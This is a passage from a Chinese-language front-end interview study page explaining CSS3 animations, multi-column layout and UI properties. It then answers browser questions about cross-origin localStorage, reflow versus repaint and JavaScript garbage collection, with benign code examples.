align=\"center\">transition-property</td>\n<td align=\"center\">规定应用过渡的 CSS 属性的名称。</td>\n</tr>\n<tr>\n<td align=\"center\">transition-duration</td>\n<td align=\"center\">定义过渡效果花费的时间。默认是 0。</td>\n</tr>\n<tr>\n<td align=\"center\">transition-timing-function</td>\n<td align=\"center\">规定过渡效果的时间曲线。默认是 “ease”。</td>\n</tr>\n<tr>\n<td align=\"center\">transition-delay</td>\n<td align=\"center\">规定过渡效果何时开始。默认是 0。</td>\n</tr>\n</tbody></table>\n<ol>\n<li><p>CSS3 动画</p>\n<p>通过 CSS3可以创建动画，这些动画可以取代网页中的画图片、Flash 动画以及 JavaScript。</p>\n<p>CSS3 中通过@keyframes 规则来创建动画。在 @keyframes 中规定某项 CSS 样式，就能创建由当前样式（动画开始前的样式）逐渐改为新样式（需要变到的样式）的动画效果。</p>\n</li>\n</ol>\n<p><strong>通过from , to关键字设置动画发生的时间</strong></p>\n<pre class=\"line-numbers language-css\" data-language=\"css\"><code class=\"language-css\"><span class=\"token comment\">/* 通过@keyframes 创建动画 */</span>\n<span class=\"token atrule\"><span class=\"token rule\">@keyframes</span> myfirst</span><span class=\"token punctuation\">&#123;</span>\n  <span class=\"token selector\">from</span> <span class=\"token punctuation\">&#123;</span><span class=\"token property\">background</span><span class=\"token punctuation\">:</span> red<span class=\"token punctuation\">;</span><span class=\"token punctuation\">&#125;</span>\n  <span class=\"token selector\">to</span> <span class=\"token punctuation\">&#123;</span><span class=\"token property\">background</span><span class=\"token punctuation\">:</span> yellow<span class=\"token punctuation\">;</span><span class=\"token punctuation\">&#125;</span>\n<span class=\"token punctuation\">&#125;</span>\n<span class=\"token comment\">/* Firefox */</span>\n<span class=\"token atrule\"><span class=\"token rule\">@-moz-keyframes</span> myfirst</span> <span class=\"token punctuation\">&#123;</span>\n  <span class=\"token selector\">from</span> <span class=\"token punctuation\">&#123;</span><span class=\"token property\">background</span><span class=\"token punctuation\">:</span> red<span class=\"token punctuation\">;</span><span class=\"token punctuation\">&#125;</span>\n  <span class=\"token selector\">to</span> <span class=\"token punctuation\">&#123;</span><span class=\"token property\">background</span><span class=\"token punctuation\">:</span> yellow<span class=\"token punctuation\">;</span><span class=\"token punctuation\">&#125;</span>\n<span class=\"token punctuation\">&#125;</span>\n<span class=\"token comment\">/* Safari 和 Chrome */</span>\n<span class=\"token atrule\"><span class=\"token rule\">@-webkit-keyframes</span> myfirst</span> <span class=\"token punctuation\">&#123;</span>\n  <span class=\"token selector\">from</span> <span class=\"token punctuation\">&#123;</span><span class=\"token property\">background</span><span class=\"token punctuation\">:</span> red<span class=\"token punctuation\">;</span><span class=\"token punctuation\">&#125;</span>\n  <span class=\"token selector\">to</span> <span class=\"token punctuation\">&#123;</span><span class=\"token property\">background</span><span class=\"token punctuation\">:</span> yellow<span class=\"token punctuation\">;</span><span class=\"token punctuation\">&#125;</span>\n<span class=\"token punctuation\">&#125;</span>\n<span class=\"token comment\">/* Opera */</span>\n<span class=\"token atrule\"><span class=\"token rule\">@-o-keyframes</span> myfirst</span> <span class=\"token punctuation\">&#123;</span>\n  <span class=\"token selector\">from</span> <span class=\"token punctuation\">&#123;</span><span class=\"token property\">background</span><span class=\"token punctuation\">:</span> red<span class=\"token punctuation\">;</span><span class=\"token punctuation\">&#125;</span>\n  <span class=\"token selector\">to</span> <span class=\"token punctuation\">&#123;</span><span class=\"token property\">background</span><span class=\"token punctuation\">:</span> yellow<span class=\"token punctuation\">;</span><span class=\"token punctuation\">&#125;</span>\n<span class=\"token punctuation\">&#125;</span>\n\n<span class=\"token comment\">/*\n   将创建的动画绑定到选择器，并至少指定以下两项 CSS3 动画属性\n   1.指定动画的名称；\n   2.指定动画的时长；\n*/</span>\n<span class=\"token selector\">div</span><span class=\"token punctuation\">&#123;</span>\n  <span class=\"token property\">animation</span><span class=\"token punctuation\">:</span> myfirst 5s<span class=\"token punctuation\">;</span>\n  <span class=\"token property\">-moz-animation</span><span class=\"token punctuation\">:</span> myfirst 5s<span class=\"token punctuation\">;</span>       <span class=\"token comment\">/* Firefox */</span>\n  <span class=\"token property\">-webkit-animation</span><span class=\"token punctuation\">:</span> myfirst 5s<span class=\"token punctuation\">;</span>    <span class=\"token comment\">/* Safari 和 Chrome */</span>\n  <span class=\"token property\">-o-animation</span><span class=\"token punctuation\">:</span> myfirst 5s<span class=\"token punctuation\">;</span>         <span class=\"token comment\">/* Opera */</span>\n<span class=\"token punctuation\">&#125;</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n<p><strong>通过百分比设置动画发生的时间</strong></p>\n<p>动画是使元素从一种样式逐渐变化为另一种样式的效果。可以改变任意多的样式任意多的次数。可以用关键词 “from” 和 “to”来设置动画变化发生的时间，其效果等同于 0% 和 100%。0% 是动画的开始，100% 是动画的完成。为了得到最佳的浏览器支持，应该始终定义 0% 和 100% 选择器。</p>\n<pre class=\"line-numbers language-css\" data-language=\"css\"><code class=\"language-css\"><span class=\"token comment\">/* 当动画为 25% 及 50% 时改变背景色，然后当动画 100% 完成时再次改变 */</span>\n<span class=\"token atrule\"><span class=\"token rule\">@keyframes</span> myfirst</span><span class=\"token punctuation\">&#123;</span>\n  <span class=\"token selector\">0%</span>   <span class=\"token punctuation\">&#123;</span><span class=\"token property\">background</span><span class=\"token punctuation\">:</span> red<span class=\"token punctuation\">;</span><span class=\"token punctuation\">&#125;</span>\n  <span class=\"token selector\">25%</span>  <span class=\"token punctuation\">&#123;</span><span class=\"token property\">background</span><span class=\"token punctuation\">:</span> yellow<span class=\"token punctuation\">;</span><span class=\"token punctuation\">&#125;</span>\n  <span class=\"token selector\">50%</span>  <span class=\"token punctuation\">&#123;</span><span class=\"token property\">background</span><span class=\"token punctuation\">:</span> blue<span class=\"token punctuation\">;</span><span class=\"token punctuation\">&#125;</span>\n  <span class=\"token selector\">100%</span> <span class=\"token punctuation\">&#123;</span><span class=\"token property\">background</span><span class=\"token punctuation\">:</span> green<span class=\"token punctuation\">;</span><span class=\"token punctuation\">&#125;</span>\n<span class=\"token punctuation\">&#125;</span>\n\n<span class=\"token comment\">/* 同时改变背景色和位置 */</span>\n<span class=\"token atrule\"><span class=\"token rule\">@keyframes</span> myfirst</span><span class=\"token punctuation\">&#123;</span>\n  <span class=\"token selector\">0%</span>   <span class=\"token punctuation\">&#123;</span><span class=\"token property\">background</span><span class=\"token punctuation\">:</span> red<span class=\"token punctuation\">;</span> <span class=\"token property\">left</span><span class=\"token punctuation\">:</span>0px<span class=\"token punctuation\">;</span> <span class=\"token property\">top</span><span class=\"token punctuation\">:</span>0px<span class=\"token punctuation\">;</span><span class=\"token punctuation\">&#125;</span>\n  <span class=\"token selector\">25%</span>  <span class=\"token punctuation\">&#123;</span><span class=\"token property\">background</span><span class=\"token punctuation\">:</span> yellow<span class=\"token punctuation\">;</span> <span class=\"token property\">left</span><span class=\"token punctuation\">:</span>200px<span class=\"token punctuation\">;</span> <span class=\"token property\">top</span><span class=\"token punctuation\">:</span>0px<span class=\"token punctuation\">;</span><span class=\"token punctuation\">&#125;</span>\n  <span class=\"token selector\">50%</span>  <span class=\"token punctuation\">&#123;</span><span class=\"token property\">background</span><span class=\"token punctuation\">:</span> blue<span class=\"token punctuation\">;</span> <span class=\"token property\">left</span><span class=\"token punctuation\">:</span>200px<span class=\"token punctuation\">;</span> <span class=\"token property\">top</span><span class=\"token punctuation\">:</span>200px<span class=\"token punctuation\">;</span><span class=\"token punctuation\">&#125;</span>\n  <span class=\"token selector\">75%</span>  <span class=\"token punctuation\">&#123;</span><span class=\"token property\">background</span><span class=\"token punctuation\">:</span> green<span class=\"token punctuation\">;</span> <span class=\"token property\">left</span><span class=\"token punctuation\">:</span>0px<span class=\"token punctuation\">;</span> <span class=\"token property\">top</span><span class=\"token punctuation\">:</span>200px<span class=\"token punctuation\">;</span><span class=\"token punctuation\">&#125;</span>\n  <span class=\"token selector\">100%</span> <span class=\"token punctuation\">&#123;</span><span class=\"token property\">background</span><span class=\"token punctuation\">:</span> red<span class=\"token punctuation\">;</span> <span class=\"token property\">left</span><span class=\"token punctuation\">:</span>0px<span class=\"token punctuation\">;</span> <span class=\"token property\">top</span><span class=\"token punctuation\">:</span>0px<span class=\"token punctuation\">;</span><span class=\"token punctuation\">&#125;</span>\n<span class=\"token punctuation\">&#125;</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n<p><strong>动画属性详解</strong></p>\n<p><code>animation</code> 是除了 <code>animation-play-state</code> 属性所有动画属性的简写属性。</p>\n<p><strong>语法：</strong> <code>animation : animation-name | animation-duration | animation-timing-function | animation-delay | animation-iteration-count | animation-direction</code></p>\n<pre class=\"line-numbers language-css\" data-language=\"css\"><code class=\"language-css\"><span class=\"token comment\">/* 应用的动画为myfirst，一个动画周期为5秒，动画的速度曲线为linear，动画2秒后播放，播放次数为infinite，即无限循环，动画下一周期是否逆向播放取值alternate，即逆向播放 */</span>\n<span class=\"token selector\">div</span><span class=\"token punctuation\">&#123;</span>\n  <span class=\"token property\">animation</span><span class=\"token punctuation\">:</span> myfirst 5s linear 2s infinite alternate<span class=\"token punctuation\">;</span>\n  <span class=\"token comment\">/* Firefox: */</span>\n  <span class=\"token property\">-moz-animation</span><span class=\"token punctuation\">:</span> myfirst 5s linear 2s infinite alternate<span class=\"token punctuation\">;</span>\n  <span class=\"token comment\">/* Safari 和 Chrome: */</span>\n  <span class=\"token property\">-webkit-animation</span><span class=\"token punctuation\">:</span> myfirst 5s linear 2s infinite alternate<span class=\"token punctuation\">;</span>\n  <span class=\"token comment\">/* Opera: */</span>\n  <span class=\"token property\">-o-animation</span><span class=\"token punctuation\">:</span> myfirst 5s linear 2s infinite alternate<span class=\"token punctuation\">;</span>\n<span class=\"token punctuation\">&#125;</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n<table>\n<thead>\n<tr>\n<th align=\"center\">属性</th>\n<th align=\"center\">描述</th>\n</tr>\n</thead>\n<tbody><tr>\n<td align=\"center\">@keyframes</td>\n<td align=\"center\">规定动画。</td>\n</tr>\n<tr>\n<td align=\"center\">animation</td>\n<td align=\"center\">所有动画属性的简写属性，除了 animation-play-state 属性。</td>\n</tr>\n<tr>\n<td align=\"center\">animation-name</td>\n<td align=\"center\">规定 @keyframes 动画的名称。</td>\n</tr>\n<tr>\n<td align=\"center\">animation-duration</td>\n<td align=\"center\">规定动画完成一个周期所花费的秒或毫秒。默认是 0。</td>\n</tr>\n<tr>\n<td align=\"center\">animation-timing-function</td>\n<td align=\"center\">规定动画的速度曲线。默认是 “ease”。</td>\n</tr>\n<tr>\n<td align=\"center\">animation-delay</td>\n<td align=\"center\">规定动画何时开始。默认是 0。</td>\n</tr>\n<tr>\n<td align=\"center\">animation-iteration-count</td>\n<td align=\"center\">规定动画被播放的次数。默认是 1。</td>\n</tr>\n<tr>\n<td align=\"center\">animation-direction</td>\n<td align=\"center\">规定动画是否在下一周期逆向地播放。默认是 “normal”。</td>\n</tr>\n<tr>\n<td align=\"center\">animation-play-state</td>\n<td align=\"center\">规定动画是否正在运行或暂停。默认是 “running”。</td>\n</tr>\n<tr>\n<td align=\"center\">animation-fill-mode</td>\n<td align=\"center\">规定对象动画时间之外的状态。</td>\n</tr>\n</tbody></table>\n<ol>\n<li><p>CSS3 多列</p>\n<p>通过 CSS3够创建多个列来对文本进行布局，就像我们经常看到的报纸的布局一样。</p>\n<p><strong>CSS3 创建多列</strong></p>\n<p><code>column-count</code> 属性规定元素应该被分隔的列数。</p>\n</li>\n</ol>\n<pre class=\"line-numbers language-css\" data-language=\"css\"><code class=\"language-css\"><span class=\"token comment\">/* 将div中的文本分为3列 */</span>\n<span class=\"token selector\">div</span><span class=\"token punctuation\">&#123;</span>\n  <span class=\"token property\">column-count</span><span class=\"token punctuation\">:</span>3<span class=\"token punctuation\">;</span>\n  <span class=\"token property\">-moz-column-count</span><span class=\"token punctuation\">:</span>3<span class=\"token punctuation\">;</span>        <span class=\"token comment\">/* Firefox */</span>\n  <span class=\"token property\">-webkit-column-count</span><span class=\"token punctuation\">:</span>3<span class=\"token punctuation\">;</span>     <span class=\"token comment\">/* Safari 和 Chrome */</span>\n<span class=\"token punctuation\">&#125;</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n<p><strong>CSS3 规定列之间的间隔</strong></p>\n<p><code>column-gap</code> 属性规定列之间的间隔。</p>\n<pre class=\"line-numbers language-css\" data-language=\"css\"><code class=\"language-css\"><span class=\"token comment\">/* 设置列之间的间隔为 40 像素 */</span>\n<span class=\"token selector\">div</span><span class=\"token punctuation\">&#123;</span>\n  <span class=\"token property\">column-gap</span><span class=\"token punctuation\">:</span>40px<span class=\"token punctuation\">;</span>\n  <span class=\"token property\">-moz-column-gap</span><span class=\"token punctuation\">:</span>40px<span class=\"token punctuation\">;</span>        <span class=\"token comment\">/* Firefox */</span>\n  <span class=\"token property\">-webkit-column-gap</span><span class=\"token punctuation\">:</span>40px<span class=\"token punctuation\">;</span>     <span class=\"token comment\">/* Safari 和 Chrome */</span>\n<span class=\"token punctuation\">&#125;</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n<p><strong>CSS3 列规则</strong></p>\n<p><code>column-rule</code> 属性设置列之间的宽度、样式和颜色规则。</p>\n<p><strong>语法：</strong> <code>column-rule : column-rule-width | column-rule-style | column-rule-color</code></p>\n<pre class=\"line-numbers language-css\" data-language=\"css\"><code class=\"language-css\"><span class=\"token selector\">div</span><span class=\"token punctuation\">&#123;</span>\n  <span class=\"token property\">column-rule</span><span class=\"token punctuation\">:</span>3px outset #ff0000<span class=\"token punctuation\">;</span>\n  <span class=\"token property\">-moz-column-rule</span><span class=\"token punctuation\">:</span>3px outset #ff0000<span class=\"token punctuation\">;</span>       <span class=\"token comment\">/* Firefox */</span>\n  <span class=\"token property\">-webkit-column-rule</span><span class=\"token punctuation\">:</span>3px outset #ff0000<span class=\"token punctuation\">;</span>    <span class=\"token comment\">/* Safari and Chrome */</span>\n<span class=\"token punctuation\">&#125;</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n<table>\n<thead>\n<tr>\n<th align=\"center\">属性</th>\n<th align=\"center\">描述</th>\n</tr>\n</thead>\n<tbody><tr>\n<td align=\"center\">column-count</td>\n<td align=\"center\">规定元素应该被分隔的列数。</td>\n</tr>\n<tr>\n<td align=\"center\">column-fill</td>\n<td align=\"center\">规定如何填充列。</td>\n</tr>\n<tr>\n<td align=\"center\">column-gap</td>\n<td align=\"center\">规定列之间的间隔。</td>\n</tr>\n<tr>\n<td align=\"center\">column-rule</td>\n<td align=\"center\">设置所有 column-rule-* 属性的简写属性。</td>\n</tr>\n<tr>\n<td align=\"center\">column-rule-width</td>\n<td align=\"center\">规定列之间规则的宽度。</td>\n</tr>\n<tr>\n<td align=\"center\">column-rule-style</td>\n<td align=\"center\">规定列之间规则的样式。</td>\n</tr>\n<tr>\n<td align=\"center\">column-rule-color</td>\n<td align=\"center\">规定列之间规则的颜色。</td>\n</tr>\n<tr>\n<td align=\"center\">column-span</td>\n<td align=\"center\">规定元素应该横跨的列数。</td>\n</tr>\n<tr>\n<td align=\"center\">column-width</td>\n<td align=\"center\">规定列的宽度。</td>\n</tr>\n<tr>\n<td align=\"center\">columns</td>\n<td align=\"center\">语法 : column-width column-count。</td>\n</tr>\n</tbody></table>\n<ol>\n<li>CSS3 用户界面</li>\n</ol>\n<p><strong>CSS3 resize</strong></p>\n<p>在 CSS3中<code>resize</code> 属性设置是否可由用户调整元素尺寸。</p>\n<pre class=\"line-numbers language-css\" data-language=\"css\"><code class=\"language-css\"><span class=\"token comment\">/* 设置div可以由用户调整大小 */</span>\n<span class=\"token selector\">div</span><span class=\"token punctuation\">&#123;</span>\n  <span class=\"token property\">resize</span><span class=\"token punctuation\">:</span>both<span class=\"token punctuation\">;</span>\n  <span class=\"token property\">overflow</span><span class=\"token punctuation\">:</span>auto<span class=\"token punctuation\">;</span>\n<span class=\"token punctuation\">&#125;</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n<p><strong>CSS3 box-sizing</strong></p>\n<p><code>box-sizing</code> 属性允许您以确切的方式定义适应某个区域的具体内容。边框计算在width中</p>\n<pre class=\"line-numbers language-css\" data-language=\"css\"><code class=\"language-css\"><span class=\"token comment\">/* 规定两个并排的带边框方框 */</span>\n<span class=\"token selector\">div</span><span class=\"token punctuation\">&#123;</span>\n  <span class=\"token property\">box-sizing</span><span class=\"token punctuation\">:</span>border-box<span class=\"token punctuation\">;</span>\n  <span class=\"token property\">-moz-box-sizing</span><span class=\"token punctuation\">:</span>border-box<span class=\"token punctuation\">;</span>        <span class=\"token comment\">/* Firefox */</span>\n  <span class=\"token property\">-webkit-box-sizing</span><span class=\"token punctuation\">:</span>border-box<span class=\"token punctuation\">;</span>     <span class=\"token comment\">/* Safari */</span>\n  <span class=\"token property\">width</span><span class=\"token punctuation\">:</span>50%<span class=\"token punctuation\">;</span>\n  <span class=\"token property\">float</span><span class=\"token punctuation\">:</span>left<span class=\"token punctuation\">;</span>\n<span class=\"token punctuation\">&#125;</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n<p><strong>CSS3 outline-offset</strong></p>\n<p><code>outline-offset</code> 属性对轮廓进行偏移，并在超出边框边缘的位置绘制轮廓。</p>\n<p>轮廓与边框有两点不同：</p>\n<blockquote><span class=\"custom-blockquote-svg\"><svg width=\"24\" height=\"24\" viewBox=\"0 0 24 24\" fill=\"\" xmlns=\"http://www.w3.org/2000/svg\" data-reactroot=\"\">\n<path fill=\"\" d=\"M22 12C22 6.5 17.5 2 12 2C6.5 2 2 6.5 2 12C2 17.5 6.5 22 12 22C13.8 22 15.5 21.5 17 20.6L22 22L20.7 17C21.5 15.5 22 13.8 22 12Z\" undefined=\"1\"></path>\n<path fill=\"\" d=\"M15.97 11.5H16.04C17.12 11.5 18 12.38 18 13.47V13.53C18 14.62 17.12 15.5 16.03 15.5H15.96C14.88 15.5 14 14.62 14 13.53V13.46C14 12.38 14.88 11.5 15.97 11.5Z\" undefined=\"1\"></path>\n<path fill=\"\" d=\"M7.97 11.5H8.04C9.12 11.5 10 12.38 10 13.47V13.53C10 14.62 9.12 15.5 8.03 15.5H7.97C6.88 15.5 6 14.62 6 13.53V13.46C6 12.38 6.88 11.5 7.97 11.5Z\" undefined=\"1\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M17 8.5C15.23 8.97 14.07 10.84 14.01 13.27C14 13.33 14 13.4 14 13.47V13.5\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M9 8.5C7.23 8.97 6.07 10.84 6.01 13.27C6 13.33 6 13.4 6 13.47V13.5\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M15.97 11.5H16.04C17.12 11.5 18 12.38 18 13.47V13.53C18 14.62 17.12 15.5 16.03 15.5H15.96C14.88 15.5 14 14.62 14 13.53V13.46C14 12.38 14.88 11.5 15.97 11.5Z\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M7.97 11.5H8.04C9.12 11.5 10 12.38 10 13.47V13.53C10 14.62 9.12 15.5 8.03 15.5H7.97C6.88 15.5 6 14.62 6 13.53V13.46C6 12.38 6.88 11.5 7.97 11.5Z\"></path>\n</svg>\n</span><ul>\n<li>轮廓不占用空间；</li>\n<li>轮廓可能是非矩形；</li>\n</ul></blockquote>\n<pre class=\"line-numbers language-css\" data-language=\"css\"><code class=\"language-css\"><span class=\"token comment\">/* 规定边框边缘之外 15 像素处的轮廓 */</span>\n<span class=\"token selector\">div</span><span class=\"token punctuation\">&#123;</span>\n  <span class=\"token property\">border</span><span class=\"token punctuation\">:</span>2px solid black<span class=\"token punctuation\">;</span>\n  <span class=\"token property\">outline</span><span class=\"token punctuation\">:</span>2px solid red<span class=\"token punctuation\">;</span>\n  <span class=\"token property\">outline-offset</span><span class=\"token punctuation\">:</span>15px<span class=\"token punctuation\">;</span>\n<span class=\"token punctuation\">&#125;</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n\n\n\n\n<h2 id=\"浏览器\"><a href=\"#浏览器\" class=\"headerlink\" title=\"浏览器\"></a>浏览器</h2><h3 id=\"1、localStorage-能跨域吗\"><a href=\"#1、localStorage-能跨域吗\" class=\"headerlink\" title=\"1、localStorage 能跨域吗\"></a>1、localStorage 能跨域吗</h3><p><strong>参考答案</strong>：</p>\n<p>不能</p>\n<p>解决方案：</p>\n<ul>\n<li>通过postMessage来实现跨源通信</li>\n<li>可以实现一个公共的iframe部署在某个域名中，作为共享域</li>\n<li>将需要实现localStorage跨域通信的页面嵌入这个iframe</li>\n<li>接入对应的SDK操作共享域，从而实现localStorage的跨域存储</li>\n</ul>\n<p><img src=\"https://static.nowcoder.com/images/activity/2021jxy/front/images/3678441071-694971ac024828f3_articlex.png\" alt=\"img\"></p>\n<h3 id=\"2、浏览器输入URL发生了什么\"><a href=\"#2、浏览器输入URL发生了什么\" class=\"headerlink\" title=\"2、浏览器输入URL发生了什么\"></a>2、浏览器输入URL发生了什么</h3><p><strong>参考答案</strong>：</p>\n<ol>\n<li>URL 解析</li>\n<li>DNS 查询</li>\n<li>TCP 连接</li>\n<li>处理请求</li>\n<li>接受响应</li>\n<li>渲染页面</li>\n</ol>\n<h3 id=\"3、重绘、重排区别如何避免\"><a href=\"#3、重绘、重排区别如何避免\" class=\"headerlink\" title=\"3、重绘、重排区别如何避免\"></a>3、重绘、重排区别如何避免</h3><p><strong>参考答案</strong>：</p>\n<ol>\n<li><p>重排(Reflow)：当渲染树的一部分必须更新并且节点的尺寸发生了变化，浏览器会使渲染树中受到影响的部分失效，并重新构造渲染树。</p>\n</li>\n<li><p>重绘(Repaint)：是在一个元素的外观被改变所触发的浏览器行为，浏览器会根据元素的新属性重新绘制，使元素呈现新的外观。比如改变某个元素的背景色、文字颜色、边框颜色等等</p>\n</li>\n<li><p>区别：<strong>重绘不一定需要重排（比如颜色的改变），重排必然导致重绘（比如改变网页位置）</strong></p>\n</li>\n<li><p>引发重排</p>\n<p>4.1 添加、删除可见的dom</p>\n<p>4.2 元素的位置改变</p>\n<p>4.3 元素的尺寸改变(外边距、内边距、边框厚度、宽高、等几何属性)</p>\n<p>4.4 页面渲染初始化</p>\n<p>4.5 浏览器窗口尺寸改变</p>\n<p>4.6 获取某些属性。当获取一些属性时，浏览器为取得正确的值也会触发重排,它会导致队列刷新，这些属性包括：offsetTop、offsetLeft、 offsetWidth、offsetHeight、scrollTop、scrollLeft、scrollWidth、scrollHeight、clientTop、clientLeft、clientWidth、clientHeight、getComputedStyle() (currentStyle in IE)。所以，在多次使用这些值时应进行缓存。</p>\n</li>\n<li><p>优化：</p>\n<p>浏览器自己的优化：</p>\n<p>浏览器会维护1个队列，把所有会引起重排，重绘的操作放入这个队列，等队列中的操作到一定数量或者到了一定时间间隔，浏览器就会flush队列，进行一批处理，这样多次重排，重绘变成一次重排重绘</p>\n<p>减少 reflow&#x2F;repaint：<br>（1）不要一条一条地修改 DOM 的样式。可以先定义好 css 的 class，然后修改 DOM 的 className。</p>\n<p>（2）不要把 DOM 结点的属性值放在一个循环里当成循环里的变量。<br>（3）为动画的 HTML 元件使用 fixed 或 absoult 的 position，那么修改他们的 CSS 是不会 reflow 的。<br>（4）千万不要使用 table 布局。因为可能很小的一个小改动会造成整个 table 的重新布局。(table及其内部元素除外，它可能需要多次计算才能确定好其在渲染树中节点的属性，通常要花3倍于同等元素的时间。这也是为什么我们要避免使用table做布局的一个原因。)</p>\n<p>（5）不要在布局信息改变的时候做查询（会导致渲染队列强制刷新）</p>\n</li>\n</ol>\n<h3 id=\"4、let-a-x3D-“sssssss”，分别存在哪儿？\"><a href=\"#4、let-a-x3D-“sssssss”，分别存在哪儿？\" class=\"headerlink\" title=\"4、let a &#x3D; “sssssss”，分别存在哪儿？\"></a>4、let a &#x3D; “sssssss”，分别存在哪儿？</h3><p><strong>参考答案</strong>：</p>\n<p> 使用let声明的全局变量不是挂在window对象下的，声明的全局变量存在于一个块级作用域中。</p>\n<p> 具体查看，我们可以通过打印一个全局函数，在let声明的全局变量在全局函数的scope下，我们平时使用时直接 用变量名称就能访问</p>\n<h3 id=\"5、浏览器垃圾回收机制\"><a href=\"#5、浏览器垃圾回收机制\" class=\"headerlink\" title=\"5、浏览器垃圾回收机制\"></a>5、浏览器垃圾回收机制</h3><p><strong>参考答案：</strong></p>\n<p><strong>1. 介绍</strong></p>\n<p>浏览器的 Javascript 具有自动垃圾回收机制(GC:Garbage Collecation)，也就是说，执行环境会负责管理代码执行过程中使用的内存。其原理是：<strong>垃圾收集器会定期（周期性）找出那些不在继续使用的变量，然后释放其内存</strong>。但是这个过程不是实时的，因为其开销比较大并且GC时停止响应其他操作，所以垃圾回收器会按照固定的时间间隔周期性的执行。</p>\n<p>不再使用的变量也就是生命周期结束的变量，当然只可能是局部变量，全局变量的生命周期直至浏览器卸载页面才会结束。局部变量只在函数的执行过程中存在，而在这个过程中会为局部变量在栈或堆上分配相应的空间，以存储它们的值，然后在函数中使用这些变量，直至函数结束，而闭包中由于内部函数的原因，外部函数并不能算是结束。</p>\n<p>还是上代码说明吧：</p>\n<pre class=\"line-numbers language-js\" data-language=\"js\"><code class=\"language-js\"><span class=\"token keyword\">function</span> <span class=\"token function\">fn1</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span>\n    <span class=\"token keyword\">var</span> obj <span class=\"token operator\">=</span> <span class=\"token punctuation\">&#123;</span><span class=\"token literal-property property\">name</span><span class=\"token operator\">:</span> <span class=\"token string\">'hanzichi'</span><span class=\"token punctuation\">,</span> <span class=\"token literal-property property\">age</span><span class=\"token operator\">:</span> <span class=\"token number\">10</span><span class=\"token punctuation\">&#125;</span><span class=\"token punctuation\">;</span>\n<span class=\"token punctuation\">&#125;</span>\n<span class=\"token keyword\">function</span> <span class=\"token function\">fn2</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span>\n    <span class=\"token keyword\">var</span> obj <span class=\"token operator\">=</span> <span class=\"token punctuation\">&#123;</span><span class=\"token literal-property property\">name</span><span class=\"token operator\">:</span><span class=\"token string\">'hanzichi'</span><span class=\"token punctuation\">,</span> <span class=\"token literal-property property\">age</span><span class=\"token operator\">:</span> <span class=\"token number\">10</span><span class=\"token punctuation\">&#125;</span><span class=\"token punctuation\">;</span>\n    <span class=\"token keyword\">return</span> obj<span class=\"token punctuation\">;</span>\n<span class=\"token punctuation\">&#125;</span>\n\n<span class=\"token keyword\">var</span> a <span class=\"token operator\">=</span> <span class=\"token function\">fn1</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token keyword\">var</span> b <span class=\"token operator\">=</span> <span class=\"token function\">fn2</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n复制代码<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n<p>我们来看代码是如何执行的。首先定义了两个function，分别叫做fn1和fn2，当fn1被调用时，进入fn1的环境，会开辟一块内存存放对象{name: ‘hanzichi’, age: 10}，而当调用结束后，出了fn1的环境，那么该块内存会被js引擎中的垃圾回收器自动释放；在fn2被调用的过程中，返回的对象被全局变量b所指向，所以该块内存并不会被释放。</p>\n<p>这里问题就出现了：到底哪个变量是没有用的？所以垃圾收集器必须跟踪到底哪个变量没用，对于不再有用的变量打上标记，以备将来收回其内存。用于标记的无用变量的策略可能因实现而有所区别，通常情况下有两种实现方式：<strong>标记清除</strong>和<strong>引用计数</strong>。引用计数不太常用，标记清除较为常用。</p>\n<p><strong>2. 标记清除</strong></p>\n<p>js中最常用的垃圾回收方式就是标记清除。当变量进入环境时，例如，在函数中声明一个变量，就将这个变量标记为“进入环境”。从逻辑上讲，永远不能释放进入环境的变量所占用的内存，因为只要执行流进入相应的环境，就可能会用到它们。而当变量离开环境时，则将其标记为“离开环境”。</p>\n<pre class=\"line-numbers language-js\" data-language=\"js\"><code class=\"language-js\"><span class=\"token keyword\">function</span> <span class=\"token function\">test</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span>\n<span class=\"token keyword\">var</span> a <span class=\"token operator\">=</span> <span class=\"token number\">10</span> <span class=\"token punctuation\">;</span>             <span class=\"token comment\">//被标记 ，进入环境 